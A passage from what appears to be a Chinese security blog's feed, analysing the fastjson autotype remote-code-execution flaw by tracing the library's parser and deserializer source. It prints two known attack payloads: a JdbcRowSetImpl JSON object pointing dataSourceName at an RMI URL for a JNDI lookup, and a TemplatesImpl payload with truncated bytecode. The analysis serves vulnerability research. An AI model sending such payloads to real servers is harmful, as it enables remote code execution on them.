rel="noopener">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a><br>[3] <a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a><br>[4] <a href="https://stackoverflow.com/questions/817853/what-is-the-difference-between-serializable-and-externalizable-in-java" target="_blank" rel="noopener">https://stackoverflow.com/questions/817853/what-is-the-difference-between-serializable-and-externalizable-in-java</a><br>[5] <a href="https://www.cnblogs.com/Welk1n/p/11066397.html" target="_blank" rel="noopener">https://www.cnblogs.com/Welk1n/p/11066397.html</a><br>[6] <a href="http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/" target="_blank" rel="noopener">http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/</a><br>[7] <a href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/" target="_blank" rel="noopener">http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/</a><br>[8] <a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank" rel="noopener">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a>  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RMI / JNDI 在反序列化, fastjson 漏洞利用的时候都经常出现, 学习一下.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="java" scheme="https://rmb122.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>fastjson RCE 分析</title>
    <link href="https://rmb122.com/2020/02/01/fastjson-RCE-%E5%88%86%E6%9E%90/"/>
    <id>https://rmb122.com/2020/02/01/fastjson-RCE-%E5%88%86%E6%9E%90/</id>
    <published>2020-02-01T10:18:25.000Z</published>
    <updated>2020-05-29T04:33:33.101Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>先看经典 payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://localhost:1099/Exploit"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>简单来说原因是 fastjson 支持反序列类, 并通过 setter, getter 的方式来为类设置属性, 比如 <code>dataSourceName</code> 就会调用 <code>setDataSourceName(&quot;rmi://localhost:1099/Exploit&quot;)</code>, 而有些类在 setter 之中, 可能有些副作用. 比如这个 payload 中的 <code>com.sun.rowset.JdbcRowSetImpl</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> autoCommit)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(autoCommit);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(autoCommit);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            DataSource ds = (DataSource)ctx.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? ds.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : ds.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>setAutoCommit</code> 的时候会 <code>ctx.lookup</code>, 之后就是 JNDI 注入了, 先不管这个, 主要还是了解 fastjson 的问题.<br>除了这个 payload 还有一个基于 <code>TemplatesImpl</code> 的 payload, </p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQExxxx"</span>],<span class="attr">"_name"</span>:<span class="string">"a.b"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"_outputProperties"</span>:&#123; &#125;,<span class="attr">"_version"</span>:<span class="string">"1.0"</span>,<span class="attr">"allowedProtocols"</span>:<span class="string">"all"</span>&#125;</span><br></pre></td></tr></table></figure><p>这个 payload 相信如果看过 ysoserial 大概都能猜出来, 不过比较不同的他的触发方法比较奇特, 不是通过 setter 来触发, 相信看完下面的内容就能理解了.</p><h2 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h2><p>一般用到最多的地方就是 spring 这种 framework, fastjson 提供了对应的接口</p><p>com.alibaba.fastjson.support.spring.FastJsonHttpMessageConverter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">readInternal</span><span class="params">(Class&lt;? extends Object&gt; clazz, HttpInputMessage inputMessage)</span> <span class="keyword">throws</span> IOException, HttpMessageNotReadableException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> readType(getType(clazz, <span class="keyword">null</span>), inputMessage);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readType</span><span class="params">(Type type, HttpInputMessage inputMessage)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InputStream in = inputMessage.getBody();</span><br><span class="line">        <span class="keyword">return</span> JSON.parseObject(in, fastJsonConfig.getCharset(), type, fastJsonConfig.getParserConfig(), fastJsonConfig.getParseProcess(), JSON.DEFAULT_PARSER_FEATURE, fastJsonConfig.getFeatures());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (JSONException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpMessageNotReadableException(<span class="string">"JSON parse error: "</span> + ex.getMessage(), ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpMessageNotReadableException(<span class="string">"I/O error while reading input message"</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到调用的就是 <code>JSON.parseObject</code>, 这是用来解析 json objcet 的, 还有个 <code>JSON.parse</code>, 这个可以用来解析 <code>123</code>, <code>&quot;123&quot;</code> 之类的 primitive.  </p><p>实际上 <code>JSON.parseObject</code> 有很多重载, 给 spring 写的接口与平常用的并不一样. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">parseObject</span><span class="params">(InputStream is, Charset charset, Type type, ParserConfig config, ParseProcess processor, <span class="keyword">int</span> featureValues, Feature... features)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (charset == <span class="keyword">null</span>) &#123;</span><br><span class="line">        charset = IOUtils.UTF8;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] bytes = allocateBytes(<span class="number">1024</span> * <span class="number">64</span>);</span><br><span class="line">    <span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">int</span> readCount = is.read(bytes, offset, bytes.length - offset);</span><br><span class="line">        <span class="keyword">if</span> (readCount == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        offset += readCount;</span><br><span class="line">        <span class="keyword">if</span> (offset == bytes.length) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] newBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[bytes.length * <span class="number">3</span> / <span class="number">2</span>];</span><br><span class="line">            System.arraycopy(bytes, <span class="number">0</span>, newBytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            bytes = newBytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (T) parseObject(bytes, <span class="number">0</span>, offset, charset, type, config, processor, featureValues, features);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">    Object obj = parse(text);</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject) obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject) JSON.toJSON(obj);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"can not cast to JSONObject."</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>平常用的在内部就是调用的 <code>JSON.parse</code>, 而且后面有个 <code>toJSON</code>, 在这其中会又序列化一遍调用 getter, 如果 getter 里面有问题, 那么也会导致漏洞. 不过一般还是用给 spring 的接口.</p><h2 id="autotype"><a href="#autotype" class="headerlink" title="autotype"></a>autotype</h2><p>autotype 就是指这个反序列化 java 类的功能, 也是漏洞的源头. 在新版本里增加了黑名单检测, 所以这里先切到旧版</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">                        ref = lexer.scanSymbol(<span class="keyword">this</span>.symbolTable, <span class="string">'"'</span>);</span><br><span class="line">                        Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, <span class="keyword">this</span>.config.getDefaultClassLoader());</span><br></pre></td></tr></table></figure><p>比较神奇的是它这个 parser, 只要 <code>@type</code> 不是这 object 的最后一个 key, 都是能正常工作的. 如果是最后一个 key, 返回一个调用默认构造器产生对象, 没有设置各种属性.<br>而如果不最后一个, 会调用 castToJavaBean 将之前解析的属性给赋值过去, 然后 deserializer.deserialze 走正常流程.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY</span><br><span class="line">        &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    String typeName = lexer.scanSymbol(symbolTable, <span class="string">'"'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.IgnoreAutoType)) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">            map.put(JSON.DEFAULT_TYPE_KEY, typeName);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">        <span class="keyword">if</span> (lexer.token() == JSONToken.RBRACE) &#123; <span class="comment">// 最后一个 key, 当然接下来就是 &#125; 了</span></span><br><span class="line">            lexer.nextToken(JSONToken.COMMA);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Object instance = <span class="keyword">null</span>;</span><br><span class="line">                ObjectDeserializer deserializer = <span class="keyword">this</span>.config.getDeserializer(clazz);</span><br><span class="line">                <span class="keyword">if</span> (deserializer <span class="keyword">instanceof</span> JavaBeanDeserializer) &#123;</span><br><span class="line">                    instance = TypeUtils.cast(object, clazz, <span class="keyword">this</span>.config);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (clazz == Cloneable.class) &#123;</span><br><span class="line">                        instance = <span class="keyword">new</span> HashMap();</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"java.util.Collections$EmptyMap"</span>.equals(typeName)) &#123;</span><br><span class="line">                        instance = Collections.emptyMap();</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"java.util.Collections$UnmodifiableMap"</span>.equals(typeName)) &#123;</span><br><span class="line">                        instance = Collections.unmodifiableMap(<span class="keyword">new</span> HashMap());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        instance = clazz.newInstance();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> instance;</span><br></pre></td></tr></table></figure><p>不过按照设计, <code>@type</code> 肯定是放在最前面的. 这应该算 UB, 不做过多讨论.<br>正常情况应该是 deserializer.deserialze. 对于普通 Bean, 创建 deserialzer 是在 <code>com.alibaba.fastjson.parser.ParserConfig</code> 的 <code>this.createJavaBeanDeserializer</code>, 取得 setter 是在 <code>JavaBeanInfo.build</code>. 判断 setter 的方法如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.startsWith(<span class="string">"set"</span>)) &#123;</span><br><span class="line">   <span class="keyword">char</span> c3 = methodName.charAt(<span class="number">3</span>);</span><br><span class="line">   String propertyName;</span><br><span class="line">   <span class="keyword">if</span> (!Character.isUpperCase(c3) &amp;&amp; c3 &lt;= <span class="number">512</span>) &#123;</span><br><span class="line">       <span class="keyword">if</span> (c3 == <span class="string">'_'</span>) &#123;</span><br><span class="line">           propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">'f'</span>) &#123;</span><br><span class="line">           propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (methodName.length() &lt; <span class="number">5</span> || !Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> <span class="keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;</span><br><span class="line">       propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>很明显, 适配了常见的两种命名方式, set_xxx 和 setXxx, 下划线和驼峰, 还有一个 fxxx 命名方式没见过, 可能是阿里内部用的多吧 (逃  </p><p>但是除了这种 setter, 实际上还会调用一些 getter, 先看相关代码  </p><p>com.alibaba.fastjson.util.JavaBeanInfo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var30 = clazz.getMethods();</span><br><span class="line">var29 = var30.length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; var29; ++i) &#123;</span><br><span class="line">    method = var30[i];</span><br><span class="line">    String methodName = method.getName();</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(<span class="string">"get"</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())) &#123;</span><br><span class="line">        JSONField annotation = (JSONField)method.getAnnotation(JSONField.class);</span><br><span class="line">        <span class="keyword">if</span> (annotation == <span class="keyword">null</span> || !annotation.deserialize()) &#123;</span><br><span class="line">            String propertyName;</span><br><span class="line">            <span class="keyword">if</span> (annotation != <span class="keyword">null</span> &amp;&amp; annotation.name().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                propertyName = annotation.name();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>可以看到判断了一下开头为 get, 且第四位为大写, 重点是后面检测了返回值, 必须继承 Map, Collection 或者是 AtomicXxxx. 这些是干嘛的呢?<br>可以看一下具体这些方法会被怎么调用就知道了  </p><p>com.alibaba.fastjson.parser.deserializer.FieldDeserializer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(Object object, Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value != <span class="keyword">null</span> || !<span class="keyword">this</span>.fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method method = <span class="keyword">this</span>.fieldInfo.method;</span><br><span class="line">            <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123; <span class="comment">// 优先调用 method, 下面是直接复制给 field, 与这里类似, 不复制了</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.getOnly) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                        AtomicInteger atomic = (AtomicInteger)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            atomic.set(((AtomicInteger)value).get());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                        AtomicLong atomic = (AtomicLong)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            atomic.set(((AtomicLong)value).get());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                        AtomicBoolean atomic = (AtomicBoolean)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            atomic.set(((AtomicBoolean)value).get());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                        Map map = (Map)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            map.putAll((Map)value);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        Collection collection = (Collection)method.invoke(object);</span><br><span class="line">                        <span class="keyword">if</span> (collection != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            collection.addAll((Collection)value);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    method.invoke(object, value);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><p>可以看到是调用了 getter, 然后赋值给这些对象, 相信现在就能明白这些是干嘛的了, 如果有一个对象, 里面有一个属性是 <code>HashMap test</code>, 且有一个 <code>public HashMap getTest()</code> 方法, 那么在反序列化时, <code>{&quot;@type&quot;: &quot;xxx.xxx&quot;, &quot;test&quot;: {&quot;aa&quot;: &quot;sss&quot;}}</code>, key =&gt; aa, value =&gt; sss 将会被加到 test 里面去, 这算一个小 feature 吧, 方便开发. 但是确实有点反直觉.  </p><p>这里顺便看一下正规反序列 (toJSON, toJSONString) 时使用的 getter 是怎么判断的, 在 <code>com.alibaba.fastjson.util.TypeUtils</code> 的 <code>buildBeanInfo</code>, 里面调用了 <code>computeGetters</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(methodName.startsWith(<span class="string">"get"</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(methodName.length() &lt; <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(methodName.equals(<span class="string">"getClass"</span>))&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(methodName.equals(<span class="string">"getDeclaringClass"</span>) &amp;&amp; clazz.isEnum())&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> c3 = methodName.charAt(<span class="number">3</span>);</span><br><span class="line">    String propertyName;</span><br><span class="line">    Field field = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(Character.isUpperCase(c3) <span class="comment">//</span></span><br><span class="line">            || c3 &gt; <span class="number">512</span> <span class="comment">// for unicode method name</span></span><br><span class="line">            )&#123;</span><br><span class="line">        <span class="keyword">if</span>(compatibleWithJavaBean)&#123;</span><br><span class="line">            propertyName = decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">        